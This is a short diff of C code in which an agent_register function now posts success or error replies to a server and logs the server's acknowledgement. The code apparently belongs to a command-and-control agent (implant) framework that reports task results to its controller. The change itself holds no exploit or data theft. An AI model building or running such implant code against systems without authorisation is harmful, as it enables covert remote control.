@@ -88,7 +88,21 @@ void agent_register(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 	}
 	#endif
 
-	// TODO load into persistent memory, perform post with success/error, print to debug console
+	// TODO load into persistent memory
+
+	BOOL result;
+	TaskPostReply reply = { 0 };
+	if (upload.error == FALSE) {
+		result = perform_post(state, task, &reply, "(TODO)", "success"); // TODO when persistent memory loading is implemented, provide some kind of identifier
+	} else {
+		result = perform_post(state, task, &reply, "upload failed", "error: upload failed");
+	}
+	
+	#ifdef CELEBI_DEBUG
+	if (result == TRUE && reply.success == 1) {
+		dprintf("Server acknowledged register output.");
+	}
+	#endif
 	
 	free_upload_manager(&upload);
 }
